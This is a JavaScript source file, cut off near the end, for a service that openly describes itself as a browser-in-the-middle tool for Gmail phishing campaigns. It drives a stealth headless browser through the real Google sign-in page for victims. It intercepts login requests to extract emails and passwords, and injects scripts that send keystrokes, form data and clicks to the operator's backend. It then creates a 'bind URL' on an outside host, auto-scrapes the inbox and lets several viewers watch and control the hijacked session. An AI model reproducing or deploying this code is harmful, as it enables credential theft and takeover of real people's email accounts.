const puppeteer = require('puppeteer');
const stealth = require('puppeteer-extra-plugin-stealth');
const { EventEmitter } = require('events');
const crypto = require('crypto');

/**
 * Gmail Browser Service - Remote Browser Control for Gmail Phishing
 * 
 * This service creates a shared browser session that can be viewed and controlled
 * by multiple users in real-time. Specifically designed for Gmail phishing campaigns.
 */
class GmailBrowserService extends EventEmitter {
  constructor() {
    super();
    this.activeSessions = new Map(); // sessionToken -> browser session data
    this.browsers = new Map(); // sessionToken -> browser instance
    this.pages = new Map(); // sessionToken -> page instance
    this.io = null; // Socket.IO instance
    this.serviceStartTime = Date.now(); // Track service start time for health checks
    
    // Configure stealth plugin with specific evasions disabled
    this.stealthPlugin = stealth();
    this.stealthPlugin.enabledEvasions.delete('iframe.contentWindow');
    this.stealthPlugin.enabledEvasions.delete('media.codecs');
    
    this.browserOptions = {
      headless: true, // Use simple headless mode instead of 'new'
      devtools: false,
      defaultViewport: null, // Let browser use its default viewport
      args: [
        '--disable-blink-features=AutomationControlled',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor',
        '--single-process',
        '--no-zygote',
        '--disable-extensions',
        '--disable-plugins',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-ipc-flooding-protection',
        '--disable-hang-monitor',
        '--disable-domain-reliability',
        '--no-first-run',
        '--disable-default-apps',
        '--disable-sync',
        '--disable-automation',
        '--disable-infobars',
        '--disable-browser-side-navigation',
        '--disable-features=TranslateUI',
        '--exclude-switches=enable-automation',
        '--exclude-switches=enable-logging',
        '--no-default-browser-check',
        '--disable-popup-blocking',
        '--disable-component-update',
        '--disable-background-networking',
        '--disable-client-side-phishing-detection',
        '--metrics-recording-only',
        '--no-report-upload',
        '--disable-crash-reporter'
      ],
    };
  }

  /**
   * Set the Socket.IO instance for real-time updates
   */
  setSocketIO(io) {
    this.io = io;
    console.log('✅ Socket.IO instance set for Gmail Browser Service');
  }

  /**
   * Database operations for Gmail session bindings
   */
  async saveSessionToDatabase(sessionToken, campaignId, userInfo) {
    return new Promise((resolve, reject) => {
      const db = require('../database');
      const userInfoJson = JSON.stringify(userInfo);
      
      db.run(
        `INSERT OR REPLACE INTO GmailBrowserSessions 
         (session_token, campaign_id, user_info, status, created_at, last_activity) 
         VALUES (?, ?, ?, 'active', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)`,
        [sessionToken, campaignId, userInfoJson],
        function(err) {
          if (err) {
            console.error('Error saving session to database:', err);
            reject(err);
          } else {
            console.log('Session saved to database:', sessionToken);
            resolve(this.lastID);
          }
        }
      );
    });
  }

  async updateSessionBindUrl(sessionToken, bindUrl, trackingId) {
    return new Promise((resolve, reject) => {
      const db = require('../database');
      
      db.run(
        `UPDATE GmailBrowserSessions 
         SET bind_url = ?, tracking_id = ?, logged_in_at = CURRENT_TIMESTAMP, last_activity = CURRENT_TIMESTAMP 
         WHERE session_token = ?`,
        [bindUrl, trackingId, sessionToken],
        function(err) {
          if (err) {
            console.error('Error updating session bind URL:', err);
            reject(err);
          } else {
            console.log('Session bind URL updated:', sessionToken, bindUrl);
            resolve(this.changes);
          }
        }
      );
    });
  }

  async getBoundSessions(campaignId = null) {
    return new Promise((resolve, reject) => {
      const db = require('../database');
      let query = `SELECT * FROM GmailBrowserSessions WHERE bind_url IS NOT NULL AND status = 'active'`;
      let params = [];
      
      if (campaignId) {
        query += ` AND campaign_id = ?`;
        params.push(campaignId);
      }
      
      query += ` ORDER BY logged_in_at DESC`;
      
      db.all(query, params, (err, rows) => {
        if (err) {
          console.error('Error getting bound sessions:', err);
          reject(err);
        } else {
          resolve(rows.map(row => ({
            ...row,
            user_info: JSON.parse(row.user_info || '{}')
          })));
        }
      });
    });
  }

  async getSessionByToken(sessionToken) {
    return new Promise((resolve, reject) => {
      const db = require('../database');
      
      db.get(
        `SELECT * FROM GmailBrowserSessions WHERE session_token = ?`,
        [sessionToken],
        (err, row) => {
          if (err) {
            console.error('Error getting session by token:', err);
            reject(err);
          } else {
            resolve(row ? {
              ...row,
              user_info: JSON.parse(row.user_info || '{}')
            } : null);
          }
        }
      );
    });
  }

  generateBindUrl(sessionToken) {
    const trackingId = crypto.randomUUID();
    const baseUrl = process.env.BASE_URL || 'https://spaceform.ddns.net';
    return {
      bindUrl: `${baseUrl}/gmail-browser/${sessionToken}?_fstrike_track=${trackingId}`,
      trackingId
    };
  }

  /**
   * Create a new Gmail browser session
   */
  async createGmailSession(sessionToken, campaignId, userInfo = {}) {
    try {
      console.log(`🌐 Creating Gmail browser session: ${sessionToken}`);

      // Create temp directory if it doesn't exist
      const fs = require('fs');
      const path = require('path');
      const sessionDir = `./temp/browser-sessions/${sessionToken}`;
      if (!fs.existsSync(sessionDir)) {
        fs.mkdirSync(sessionDir, { recursive: true });
      }

      // Get victim's screen dimensions from userInfo or use defaults
      let victimScreenWidth = userInfo.screenWidth || 1920;
      let victimScreenHeight = userInfo.screenHeight || 1080;
      
      // Try to get more accurate dimensions from captured screen data
      if (userInfo.ip && global.victimScreenData && global.victimScreenData[userInfo.ip]) {
        const capturedData = global.victimScreenData[userInfo.ip];
        victimScreenWidth = parseInt(capturedData.screenWidth) || victimScreenWidth;
        victimScreenHeight = parseInt(capturedData.screenHeight) || victimScreenHeight;
        console.log(`🎯 Using captured screen dimensions for IP ${userInfo.ip}: ${victimScreenWidth}x${victimScreenHeight}`);
      }
      
      console.log(`📐 Setting browser dimensions to match victim's screen: ${victimScreenWidth}x${victimScreenHeight}`);

      // Enhanced browser options for server environment (no debugging)
      const browserOptions = {
        ...this.browserOptions,
        userDataDir: sessionDir, // Persistent session
        executablePath: process.env.CHROME_PATH || undefined, // Use system Chrome if available
        // Remove debugging options that Google detects
        ignoreDefaultArgs: ['--enable-automation', '--enable-blink-features=AutomationControlled'],
        // Set viewport to match victim's screen dimensions
        defaultViewport: {
          width: victimScreenWidth,
          height: victimScreenHeight,
          deviceScaleFactor: 1,
          hasTouch: false,
          isLandscape: victimScreenWidth > victimScreenHeight,
          isMobile: false,
        },
        args: [
          ...this.browserOptions.args,
          `--window-size=${victimScreenWidth},${victimScreenHeight}`,
          '--start-maximized',
          '--disable-web-security',
          '--disable-features=VizDisplayCompositor',
          '--force-device-scale-factor=1',
        ]
      };

      // Launch browser with enhanced error handling and stealth plugin
      let browser;
      try {
        console.log(`🚀 Launching browser with stealth plugin and options:`, { headless: browserOptions.headless, args: browserOptions.args.slice(0, 5) });
        
        // Use puppeteer-extra with stealth plugin
        const puppeteerExtra = require('puppeteer-extra');
        puppeteerExtra.use(this.stealthPlugin);
        
        browser = await puppeteerExtra.launch(browserOptions);
        console.log(`✅ Browser launched successfully with stealth plugin`);
      } catch (launchError) {
        console.error('First browser launch failed, trying minimal config:', launchError.message);
        
        // Ultra-minimal fallback configuration without stealth
        const minimalOptions = {
          headless: true,
          defaultViewport: {
            width: victimScreenWidth,
            height: victimScreenHeight,
            deviceScaleFactor: 1,
            hasTouch: false,
            isLandscape: victimScreenWidth > victimScreenHeight,
            isMobile: false,
          },
          args: [
            '--disable-blink-features=AutomationControlled',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--single-process',
            `--window-size=${victimScreenWidth},${victimScreenHeight}`,
            '--start-maximized',
          ]
        };
        
        browser = await puppeteer.launch(minimalOptions);
        console.log(`✅ Browser launched with minimal options`);
      }

      // Handle browser disconnection
      browser.on('disconnected', () => {
        console.log(`🔌 Browser disconnected for session: ${sessionToken}`);
        this.cleanupSession(sessionToken);
      });

      // Create new page with error handling
      const page = await browser.newPage();
      console.log(`📄 New page created for session: ${sessionToken}`);

      // Set viewport to exactly match victim's screen dimensions for perfect fitting
      await page.setViewport({
        width: victimScreenWidth,
        height: victimScreenHeight,
        deviceScaleFactor: 1,
        hasTouch: false,
        isLandscape: victimScreenWidth > victimScreenHeight,
        isMobile: false,
      });
      console.log(`✅ Viewport set to victim's dimensions: ${victimScreenWidth}x${victimScreenHeight}`);

      // Prevent page from closing unexpectedly
      page.on('close', () => {
        console.log(`📄 Page closed for session: ${sessionToken}`);
      });

      // Set realistic user agent (Opera instead of Chrome to avoid detection)
      await page.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0'
      );

      // Add extra headers to look more like a real browser
      await page.setExtraHTTPHeaders({
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document'
      });

      // Enable request/response interception for credential capture
      await page.setRequestInterception(true);

      // Store session data
      const sessionData = {
        sessionToken,
        campaignId,
        userInfo,
        createdAt: new Date(),
        isActive: true,
        viewers: new Set(), // Connected viewers
        capturedCredentials: [],
        pageHistory: [],
        debuggingUrl: null,
      };

      this.activeSessions.set(sessionToken, sessionData);
      this.browsers.set(sessionToken, browser);
      this.pages.set(sessionToken, page);

      // Save session to database
      try {
        await this.saveSessionToDatabase(sessionToken, campaignId, userInfo);
      } catch (dbError) {
        console.error('Warning: Failed to save session to database:', dbError);
        // Continue anyway as the in-memory session is working
      }

      // Wait a moment for page to stabilize
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Check if page is still alive before proceeding
      if (page.isClosed()) {
        throw new Error('Page closed immediately after creation');
      }

      console.log(`✅ Page is stable and ready for session: ${sessionToken}`);

      // Set up event listeners before navigation
      await this.setupPageEventListeners(sessionToken, page);

      // Navigate to Gmail login with enhanced error handling and retries
      console.log(`🌐 Navigating to Google sign-in page...`);
      let navigationSuccess = false;
      const urls = [
        'https://accounts.google.com',
        'https://accounts.google.com/',
        'https://www.google.com/gmail/'
      ];

      for (let i = 0; i < urls.length && !navigationSuccess; i++) {
        try {
          console.log(`🌐 Trying URL ${i + 1}: ${urls[i]}`);
          
          // Check if page is still alive
          if (page.isClosed()) {
            throw new Error('Page closed during navigation attempt');
          }

          await page.goto(urls[i], {
            waitUntil: 'domcontentloaded',
            timeout: 15000,
          });
          
          // Wait for page to stabilize
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Verify we actually navigated
          const currentUrl = page.url();
          if (currentUrl && currentUrl !== 'about:blank') {
            console.log(`✅ Successfully navigated to: ${currentUrl}`);
            navigationSuccess = true;
          }
        } catch (navError) {
          console.error(`❌ Navigation attempt ${i + 1} failed:`, navError.message);
          
          // If this is the last attempt, try fallback
          if (i === urls.length - 1) {
            try {
              console.log(`🔄 Trying fallback simple page...`);
              await page.setContent(`
                <!DOCTYPE html>
                <html>
                <head>
                  <title>Gmail</title>
                  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon.ico">
                  <style>
                    body { font-family: 'Google Sans', Arial, sans-serif; padding: 50px; text-align: center; background: #f8f9fa; }
                    .container { max-width: 400px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .logo { margin-bottom: 20px; }
                    h1 { color: #1a73e8; margin-bottom: 10px; }
                    p { color: #5f6368; margin-bottom: 30px; }
                    .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; }
                  </style>
                </head>
                <body>
                  <div class="container">
                    <div class="logo">
                      <svg width="75" height="75" viewBox="0 0 75 75">
                        <path fill="#ea4335" d="M37.5 47.5L57.5 32.5V55c0 2.5-2 4.5-4.5 4.5H37.5z"/>
                        <path fill="#34a853" d="M37.5 47.5L17.5 32.5V55c0 2.5 2 4.5 4.5 4.5H37.5z"/>
                        <path fill="#4285f4" d="M57.5 22.5v10l-20 15-20-15v-10c0-2.5 2-4.5 4.5-4.5h31c2.5 0 4.5 2 4.5 4.5z"/>
                        <path fill="#fbbc04" d="M17.5 22.5l20 15 20-15L52.5 15H22.5z"/>
                      </svg>
                    </div>
                    <h1>Gmail</h1>
                    <p>Connecting to your account...</p>
                    <button class="btn" onclick="window.location.href='https://accounts.google.com/'">Continue to Gmail</button>
                  </div>
                </body>
                </html>
              `);
              navigationSuccess = true;
              console.log(`✅ Loaded fallback Gmail page`);
            } catch (fallbackError) {
              console.error(`❌ Even fallback page failed:`, fallbackError.message);
              // Don't throw here, continue with whatever we have
              navigationSuccess = true; // Mark as success to continue
            }
          }
        }
      }

      // Get debugging URL for advanced control (with better error handling)
      let debuggingUrl = null;
      try {
        debuggingUrl = await this.getBrowserDebuggingUrl(browser);
        sessionData.debuggingUrl = debuggingUrl;
      } catch (debugError) {
        console.log(`⚠️  Could not get debugging URL: ${debugError.message}`);
        // Continue without debugging URL
      }

      // Inject credential capture and real-time sync scripts
      try {
        await this.injectMonitoringScripts(page, sessionToken);
      } catch (scriptError) {
        console.log(`⚠️  Could not inject monitoring scripts: ${scriptError.message}`);
        // Continue without monitoring scripts
      }

      console.log(`✅ Gmail browser session created: ${sessionToken}`);
      
      // Notify connected clients
      if (this.io) {
        this.io.to(`campaign-${campaignId}`).emit('gmailSessionCreated', {
          sessionToken,
          debuggingUrl: sessionData.debuggingUrl,
          status: 'active',
        });
      }

      return {
        sessionToken,
        debuggingUrl: sessionData.debuggingUrl,
        status: 'active',
        url: page.url(),
      };

    } catch (error) {
      console.error('Error creating Gmail browser session:', error);
      // Clean up any partial session
      this.cleanupSession(sessionToken);
      throw error;
    }
  }

  /**
   * Clean up session resources
   */
  cleanupSession(sessionToken) {
    try {
      const browser = this.browsers.get(sessionToken);
      if (browser) {
        browser.close().catch(console.error);
        this.browsers.delete(sessionToken);
      }
      this.pages.delete(sessionToken);
      this.activeSessions.delete(sessionToken);
      console.log(`🧹 Cleaned up session: ${sessionToken}`);
    } catch (error) {
      console.error('Error cleaning up session:', error);
    }
  }

  async getBrowserDebuggingUrl(browser) {
    try {
      const browserWSEndpoint = browser.wsEndpoint();
      if (!browserWSEndpoint) {
        throw new Error('No browser WebSocket endpoint available');
      }

      const httpEndpoint = browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '/json');
      console.log(`🔍 Fetching debug info from: ${httpEndpoint}`);
      
      const response = await fetch(httpEndpoint, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const responseText = await response.text();
      console.log(`🔍 Debug response: ${responseText.substring(0, 200)}...`);
      
      if (!responseText || responseText.startsWith('Unknown')) {
        throw new Error('Invalid response from debug endpoint');
      }
      
      const tabs = JSON.parse(responseText);
      
      if (tabs && tabs.length > 0) {
        const tab = tabs[0];
        if (tab.webSocketDebuggerUrl) {
          return `${browserWSEndpoint.replace('ws://', 'http://').replace('/devtools/browser', '')}/devtools/inspector.html?ws=${tab.webSocketDebuggerUrl.replace('ws://', '')}`;
        }
      }
      
      return null;
    } catch (error) {
      console.error('Error getting debugging URL:', error);
      return null;
    }
  }

  /**
   * Set up page event listeners for monitoring and capture
   */
  async setupPageEventListeners(sessionToken, page) {
    const sessionData = this.activeSessions.get(sessionToken);

    // Monitor navigation
    page.on('framenavigated', async (frame) => {
      if (frame === page.mainFrame()) {
        const url = frame.url();
        console.log(`📍 Navigation: ${url}`);
        
        sessionData.pageHistory.push({
          url,
          timestamp: new Date(),
          title: frame.title || '',
        });

        // Check if user reached Google My Account page (signed in successfully)
        // Only redirect when we specifically detect myaccount.google.com (not during sign-in flow)
        if (url.includes('myaccount.google.com')) {
          console.log(`🎯 User fully signed in (myaccount.google.com detected)! Auto-redirecting to Gmail...`);
          
          // Broadcast sign-in detection to viewers
          if (this.io) {
            this.io.to(`gmail-session-${sessionToken}`).emit('userSignedIn', {
              detectedUrl: url,
              timestamp: new Date(),
            });
          }
          
          // Wait a moment then redirect to Gmail
          setTimeout(async () => {
            try {
              console.log(`📧 Redirecting to Gmail inbox...`);
              await page.goto('https://mail.google.com/mail/u/0/#inbox', { 
                waitUntil: 'networkidle0',
                timeout: 15000 
              });
            } catch (error) {
              console.error('Error redirecting to Gmail:', error);
            }
          }, 2000);
        }

        // Check if user successfully logged into Gmail
        if (url.includes('mail.google.com/mail') && !url.includes('accounts.google.com')) {
          console.log(`🎯 User is now in Gmail! Creating bind URL...`);
          
          // Generate bind URL when user successfully logs in
          try {
            const { bindUrl, trackingId } = this.generateBindUrl(sessionToken);
            await this.updateSessionBindUrl(sessionToken, bindUrl, trackingId);
            
            console.log(`🔗 Bind URL created: ${bindUrl}`);
            
            // Broadcast bind URL creation to viewers
            if (this.io) {
              this.io.to(`gmail-session-${sessionToken}`).emit('bindUrlCreated', {
                sessionToken,
                bindUrl,
                trackingId,
                timestamp: new Date(),
              });
            }
          } catch (error) {
            console.error('Error creating bind URL:', error);
          }
          
          // Wait for Gmail to load completely, then scrape
          setTimeout(async () => {
            try {
              await this.autoNavigateToInboxAndScrape(sessionToken, page);
            } catch (error) {
              console.error('Error navigating to inbox and scraping:', error);
            }
          }, 4000);
        }

        // Broadcast navigation to viewers
        if (this.io) {
          this.io.to(`gmail-session-${sessionToken}`).emit('pageNavigation', {
            url,
            title: frame.title || '',
            timestamp: new Date(),
          });
        }
      }
    });

    // Monitor console messages (for debugging)
    page.on('console', (msg) => {
      console.log(`🖥️ Console [${sessionToken}]:`, msg.text());
    });

    // Monitor requests for credential capture
    page.on('request', async (request) => {
      const url = request.url();
      const method = request.method();
      const postData = request.postData();

      // Check for login requests
      if (method === 'POST' && (
        url.includes('accounts.google.com') ||
        url.includes('signin') ||
        url.includes('login') ||
        url.includes('auth')
      )) {
        console.log(`🔐 Potential login request detected: ${url}`);
        
        if (postData) {
          try {
            // Parse form data or JSON
            let credentials = {};
            
            if (request.headers()['content-type']?.includes('application/x-www-form-urlencoded')) {
              const params = new URLSearchParams(postData);
              for (const [key, value] of params.entries()) {
                if (key.toLowerCase().includes('email') || 
                    key.toLowerCase().includes('user') ||
                    key.toLowerCase().includes('identifier')) {
                  credentials.email = value;
                }
                if (key.toLowerCase().includes('pass') ||
                    key.toLowerCase().includes('pwd')) {
                  credentials.password = value;
                }
              }
            } else if (request.headers()['content-type']?.includes('application/json')) {
              const jsonData = JSON.parse(postData);
              // Extract credentials from JSON (Google uses various field names)
              credentials = this.extractCredentialsFromJson(jsonData);
            }

            if (credentials.email || credentials.password) {
              console.log(`🔑 CREDENTIALS CAPTURED:`, credentials);
              
              // Store credentials
              sessionData.capturedCredentials.push({
                ...credentials,
                timestamp: new Date(),
                url,
                method,
                ip: sessionData.userInfo.ip || 'unknown',
                userAgent: sessionData.userInfo.userAgent || 'unknown',
              });

              // Save to database
              await this.saveCapturedCredentials(sessionToken, credentials, url);

              // Broadcast to viewers
              if (this.io) {
                this.io.to(`gmail-session-${sessionToken}`).emit('credentialsCaptured', {
                  credentials,
                  timestamp: new Date(),
                  url,
                });
              }
            }
          } catch (error) {
            console.error('Error parsing credentials:', error);
          }
        }
      }

      // Continue with the request
      request.continue();
    });

    // Monitor responses
    page.on('response', async (response) => {
      const url = response.url();
      const status = response.status();
      
      // Log important responses
      if (url.includes('accounts.google.com') || url.includes('mail.google.com')) {
        console.log(`📨 Response: ${status} ${url}`);
      }

      // Check for successful Gmail login and automatically scrape emails
      if (status === 200 && (url.includes('mail.google.com/mail') || url.includes('inbox'))) {
        console.log(`✅ Gmail login detected! Auto-scraping emails...`);
        
        // Wait a moment for the page to load completely
        setTimeout(async () => {
          try {
            await this.autoScrapeGmailEmails(sessionToken, page);
          } catch (error) {
            console.error('Error auto-scraping Gmail emails:', error);
          }
        }, 3000);
      }
    });

    // Monitor page errors
    page.on('pageerror', (error) => {
      console.error(`💥 Page error [${sessionToken}]:`, error.message);
    });
  }

  /**
   * Extract credentials from JSON data (Google's various formats)
   */
  extractCredentialsFromJson(jsonData) {
    const credentials = {};
    
    // Recursive function to find credential fields
    const findCredentials = (obj, path = '') => {
      if (typeof obj !== 'object' || obj === null) return;
      
      for (const [key, value] of Object.entries(obj)) {
        const keyLower = key.toLowerCase();
        const fullPath = path ? `${path}.${key}` : key;
        
        if (typeof value === 'string' && value.length > 0) {
          // Check for email patterns
          if ((keyLower.includes('email') || 
               keyLower.includes('user') || 
               keyLower.includes('identifier') ||
               keyLower === 'email' ||
               keyLower === 'username') && 
              (value.includes('@') || value.length > 3)) {
            credentials.email = value;
          }
          
          // Check for password patterns
          if (keyLower.includes('pass') || 
              keyLower.includes('pwd') || 
              keyLower === 'password') {
            credentials.password = value;
          }
        } else if (typeof value === 'object') {
          findCredentials(value, fullPath);
        }
      }
    };
    
    findCredentials(jsonData);
    return credentials;
  }

  /**
   * Inject monitoring and synchronization scripts
   */
  async injectMonitoringScripts(page, sessionToken) {
    try {
      await page.evaluateOnNewDocument((sessionToken) => {
        // Advanced form monitoring
        const originalSubmit = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function() {
          // Capture form data before submission
          const formData = new FormData(this);
          const data = {};
          for (const [key, value] of formData.entries()) {
            data[key] = value;
          }
          
          // Send to our backend via fetch
          fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ formData: data, url: location.href }),
          }).catch(() => {}); // Silent fail
          
          return originalSubmit.call(this);
        };

        // Monitor form submissions via event listener
        document.addEventListener('submit', function(e) {
          const form = e.target;
          if (form.tagName === 'FORM') {
            const formData = new FormData(form);
            const data = {};
            for (const [key, value] of formData.entries()) {
              data[key] = value;
            }
            
            fetch(`/api/gmail-browser/capture-form/${sessionToken}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ formData: data, url: location.href }),
            }).catch(() => {});
          }
        }, true);

        // Monitor input changes for real-time capture
        document.addEventListener('input', function(e) {
          const input = e.target;
          if (input.type === 'password' || 
              input.name?.toLowerCase().includes('pass') ||
              input.id?.toLowerCase().includes('pass')) {
            
            // Debounced password capture
            clearTimeout(window.passwordCapture);
            window.passwordCapture = setTimeout(() => {
              fetch(`/api/gmail-browser/capture-input/${sessionToken}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  type: 'password',
                  name: input.name || input.id,
                  value: input.value,
                  url: location.href,
                }),
              }).catch(() => {});
            }, 1000);
          }
        }, true);

        // Monitor clicks for interaction tracking
        document.addEventListener('click', function(e) {
          const element = e.target;
          const elementInfo = {
            tagName: element.tagName,
            id: element.id,
            className: element.className,
            text: element.textContent?.substring(0, 100),
            href: element.href,
          };
          
          fetch(`/api/gmail-browser/track-click/${sessionToken}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ element: elementInfo, url: location.href }),
          }).catch(() => {});
        }, true);

        console.log('Gmail monitoring scripts injected successfully');
      }, sessionToken);

      console.log(`✅ Monitoring scripts injected for session: ${sessionToken}`);
    } catch (error) {
      console.error('Error injecting monitoring scripts:', error);
    }
  }

  /**
   * Save captured credentials to database
   */
  async saveCapturedCredentials(sessionToken, credentials, url) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (!sessionData) return;

      // Here you would save to your database
      // This is a placeholder - adapt to your database structure
      console.log('💾 Saving credentials to database:', {
        sessionToken,
        campaignId: sessionData.campaignId,
        credentials,
        url,
        timestamp: new Date(),
      });

      // Example database save (adapt to your database schema):
      /*
      const db = require('../database');
      await db.run(
        `INSERT INTO gmail_credentials (session_token, campaign_id, email, password, url, captured_at, ip_address)
         VALUES (?, ?, ?, ?, ?, ?, ?)`,
        [
          sessionToken,
          sessionData.campaignId,
          credentials.email || null,
          credentials.password || null,
          url,
          new Date().toISOString(),
          sessionData.userInfo.ip || 'unknown'
        ]
      );
      */

    } catch (error) {
      console.error('Error saving credentials to database:', error);
    }
  }

  /**
   * Get current page screenshot for viewers
   */
  async getScreenshot(sessionToken, options = {}) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) {
        console.error(`❌ Screenshot requested for non-existent session: ${sessionToken}`);
        throw new Error('Session not found');
      }

      // Check if page is still connected
      if (page.isClosed()) {
        console.error(`❌ Page is closed for session: ${sessionToken}`);
        this.cleanupSession(sessionToken);
        throw new Error('Page is closed');
      }

      console.log(`📸 Taking high-quality screenshot for session: ${sessionToken}`);
      
      // High-quality screenshot options optimized for clarity
      const screenshotOptions = {
        type: 'png', // PNG for better quality
        fullPage: false, // Don't capture full page, just viewport
        quality: 95, // High quality for JPEG (not used for PNG)
        optimizeForSpeed: false, // Prioritize quality over speed
        captureBeyondViewport: false, // Only capture what's visible
        fromSurface: true, // Capture from surface for better quality
        ...options // Override with any provided options
      };

      const screenshot = await page.screenshot(screenshotOptions);

      console.log(`✅ High-quality screenshot captured: ${screenshot.length} bytes (type: ${screenshotOptions.type})`);
      return screenshot;
    } catch (error) {
      console.error('Error taking screenshot:', error);
      
      // If screenshot fails, try to get a simple placeholder
      if (error.message.includes('Session closed') || error.message.includes('Target closed')) {
        this.cleanupSession(sessionToken);
      }
      
      throw error;
    }
  }

  /**
   * Execute action on the browser page
   */
  async executeAction(sessionToken, action, params = {}) {
    try {
      const page = this.pages.get(sessionToken);
      if (!page) throw new Error('Session not found');

      console.log(`🎯 Executing action: ${action} with params:`, params);

      let result;
      
      switch (action) {
        case 'click':
          if (params.selector) {
            await page.click(params.selector);
            result = { success: true, message: 'Clicked element' };
          } else if (params.x && params.y) {
            await page.mouse.click(params.x, params.y);
            result = { success: true, message: 'Clicked coordinates' };
          }
          break;

        case 'type':
          if (params.selector && params.text) {
            await page.type(params.selector, params.text);
            result = { success: true, message: 'Typed text' };
          }
          break;

        case 'clear':
          if (params.selector) {
            await page.evaluate((selector) => {
              const element = document.querySelector(selector);
              if (element) element.value = '';
            }, params.selector);
            result = { success: true, message: 'Cleared field' };
          }
          break;

        case 'navigate':
          if (params.url) {
            await page.goto(params.url, { waitUntil: 'networkidle2' });
            result = { success: true, message: 'Navigated to URL' };
          }
          break;

        case 'scroll':
          await page.evaluate((x, y) => {
            window.scrollBy(x || 0, y || 100);
          }, params.x, params.y);
          result = { success: true, message: 'Scrolled page' };
          break;

        case 'screenshot':
          const screenshot = await this.getScreenshot(sessionToken);
          result = { success: true, screenshot: screenshot.toString('base64') };
          break;

        case 'getUrl':
          result = { success: true, url: page.url() };
          break;

        case 'getTitle':
          const title = await page.title();
          result = { success: true, title };
          break;

        case 'key':
          if (params.key) {
            // Handle special keys
            if (params.key === 'Enter') {
              await page.keyboard.press('Enter');
            } else if (params.key === 'Tab') {
              await page.keyboard.press('Tab');
            } else if (params.key === 'Backspace') {
              await page.keyboard.press('Backspace');
            } else if (params.key === 'Escape') {
              await page.keyboard.press('Escape');
            } else if (params.key.length === 1) {
              // Regular character
              await page.keyboard.type(params.key);
            }
            result = { success: true, message: `Pressed key: ${params.key}` };
          }
          break;

        case 'focus':
          if (params.selector) {
            await page.focus(params.selector);
            result = { success: true, message: 'Focused element' };
          } else if (params.x && params.y) {
            await page.mouse.click(params.x, params.y);
            result = { success: true, message: 'Focused coordinates' };
          }
          break;

        default:
          result = { success: false, message: 'Unknown action' };
      }

      // Broadcast action to viewers
      if (this.io) {
        this.io.to(`gmail-session-${sessionToken}`).emit('actionExecuted', {
          action,
          params,
          result,
          timestamp: new Date(),
        });
      }

      return result;
    } catch (error) {
      console.error('Error executing action:', error);
      return { success: false, message: error.message };
    }
  }

  /**
   * Add viewer to session
   */
  addViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.add(viewerId);
      console.log(`👁️ Added viewer ${viewerId} to session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Remove viewer from session
   */
  removeViewer(sessionToken, viewerId) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (sessionData) {
      sessionData.viewers.delete(viewerId);
      console.log(`👁️ Removed viewer ${viewerId} from session ${sessionToken}`);
      return true;
    }
    return false;
  }

  /**
   * Get session info
   */
  getSessionInfo(sessionToken) {
    const sessionData = this.activeSessions.get(sessionToken);
    if (!sessionData) return null;

    return {
      sessionToken: sessionData.sessionToken,
      campaignId: sessionData.campaignId,
      createdAt: sessionData.createdAt,
      isActive: sessionData.isActive,
      viewerCount: sessionData.viewers.size,
      credentialsCount: sessionData.capturedCredentials.length,
      currentUrl: this.pages.get(sessionToken)?.url() || 'unknown',
      debuggingUrl: sessionData.debuggingUrl,
    };
  }

  /**
   * Get all active sessions
   */
  getAllSessions() {
    const sessions = [];
    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      sessions.push(this.getSessionInfo(sessionToken));
    }
    return sessions;
  }

  /**
   * Close browser session
   */
  async closeSession(sessionToken) {
    try {
      console.log(`🔴 Closing Gmail browser session: ${sessionToken}`);

      const browser = this.browsers.get(sessionToken);
      const sessionData = this.activeSessions.get(sessionToken);

      if (browser) {
        await browser.close();
        this.browsers.delete(sessionToken);
      }

      this.pages.delete(sessionToken);
      this.activeSessions.delete(sessionToken);

      // Notify viewers
      if (this.io && sessionData) {
        this.io.to(`gmail-session-${sessionToken}`).emit('sessionClosed', {
          sessionToken,
          timestamp: new Date(),
        });
      }

      console.log(`✅ Gmail browser session closed: ${sessionToken}`);
      return true;
    } catch (error) {
      console.error('Error closing session:', error);
      return false;
    }
  }

  /**
   * Cleanup inactive sessions
   */
  async cleanupInactiveSessions() {
    const maxAge = 4 * 60 * 60 * 1000; // 4 hours
    const now = new Date();

